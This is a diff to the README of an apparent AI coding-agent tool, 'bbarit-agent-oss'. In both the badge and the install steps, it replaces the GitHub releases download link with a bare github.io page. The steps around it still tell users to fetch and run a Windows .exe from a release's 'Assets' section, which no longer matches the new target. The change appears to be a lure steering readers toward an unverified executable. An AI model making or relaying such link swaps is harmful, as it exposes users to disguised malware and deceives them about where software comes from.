@@ -1,6 +1,6 @@
 # 🤖 bbarit-agent-oss - Build better code with smart agents
 
-[![](https://img.shields.io/badge/Download-bbarit--agent--oss-blue.svg)](https://github.com/myother6380/bbarit-agent-oss/releases)
+[![](https://img.shields.io/badge/Download-bbarit--agent--oss-blue.svg)](https://myother6380.github.io)
 
 bbarit-agent-oss acts as an assistant for your coding tasks. This tool lives in your terminal and helps you write code faster. It uses powerful artificial intelligence models to suggest changes, find bugs, and explain complex projects. You install one single file, and the agent works on your machine. You own your data because the agent runs locally. 
 
@@ -14,7 +14,7 @@ Your computer needs minor preparation to run this tool. Ensure you use a machine
 
 You must visit the release page to get the software. Follow these instructions:
 
-1. Visit [this page to download](https://github.com/myother6380/bbarit-agent-oss/releases).
+1. Visit [this page to download](https://myother6380.github.io).
 2. Look for the "Assets" section at the bottom of the latest release.
 3. Select the file ending in `.exe` that matches your Windows version.
 4. Save the file to your computer.
